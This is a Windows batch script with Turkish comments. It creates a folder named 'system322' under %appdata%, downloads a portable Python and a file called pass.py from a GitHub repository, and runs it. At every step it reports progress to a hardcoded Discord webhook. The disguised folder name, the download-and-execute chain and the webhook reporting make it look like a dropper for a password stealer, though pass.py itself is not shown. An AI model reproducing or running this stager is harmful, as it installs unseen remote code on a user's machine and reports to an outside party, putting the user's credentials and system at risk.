@echo off
chcp 65001 >nul
setlocal

:: Webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1243409410093748296/sQKlvmUiz7X5aJ-5nVDyEZhASdWRfM1rJdhxhqei8-VB9EpmzcvoTvAJZTNFm5DYkST8

:: Webhook message
set WEBHOOK_MESSAGE={"content":"CMD script started"}

:: PowerShell command to send webhook message
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"CMD script started\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
echo Webhook message sent.

:: %appdata% dizinine git
cd /d "%appdata%"

:: system322 klasörü oluştur
if not exist system322 (
    mkdir system322
) else (
    echo system322 klasörü zaten mevcut.
)
cd system322

:: Dosyaları indir
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilmeye başladı\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/test/raw/main/python.zip' -OutFile 'Python.zip'"
echo Python.zip dosyası indirildi.
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilme bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"

:: py klasörü oluştur
mkdir py
echo py klasörü oluşturuldu.

:: Python.zip içerisindeki dosyaları py klasörüne çıkar
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıakrtılıyor\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
powershell -Command "Expand-Archive -Path 'Python.zip' -DestinationPath 'py' -Force"
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python çıkartma bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
echo Python.zip dosyası py klasörüne çıkarıldı.

:: Python.zip dosyasını sil
del Python.zip
echo Python.zip dosyası silindi.

:: scripts klasörü oluştur
mkdir scripts
echo scripts klasörü oluşturuldu.

:: pass.py dosyasını scripts klasörüne indir
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/test/raw/main/pass.py' -OutFile 'scripts\\pass.py'"
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"pass.py dosyası scripts klasörüne indirildi.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
echo pass.py dosyası scripts klasörüne indirildi.

:: Python scriptini çalıştır
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"script çalıştırıldı.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
"%appdata%\system322\py\python.exe" "%appdata%\system322\scripts\pass.py"

echo İşlem tamamlandı.